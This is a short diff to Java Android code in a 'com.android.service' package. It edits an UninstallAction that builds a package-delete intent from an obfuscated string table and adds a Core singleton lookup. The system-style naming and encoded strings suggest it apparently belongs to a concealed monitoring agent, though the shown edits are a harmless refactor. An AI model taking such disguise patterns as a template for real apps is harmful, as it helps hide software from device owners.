@@ -9,11 +9,10 @@
 
 package com.android.service.action;
 
-import org.json.JSONObject;
-
 import android.content.Intent;
 import android.net.Uri;
 
+import com.android.service.Core;
 import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.Trigger;
@@ -57,10 +56,10 @@ public class UninstallAction extends SubActionSlow {
 	 * Actual execute.
 	 */
 	public static boolean actualExecute() {
-
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (actualExecute): uninstall");//$NON-NLS-1$
 		}
+		
 		final Markup markup = new Markup(0);
 		markup.createEmptyMarkup();
 
@@ -116,6 +115,8 @@ public class UninstallAction extends SubActionSlow {
 			Check.log(TAG + " (deleteApplication)");//$NON-NLS-1$
 		}
 
+		Core core = Core.getInstance();
+		
 		final Uri packageURI = Uri.parse(Messages.getString("2.0")); //$NON-NLS-1$
 
 		final Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
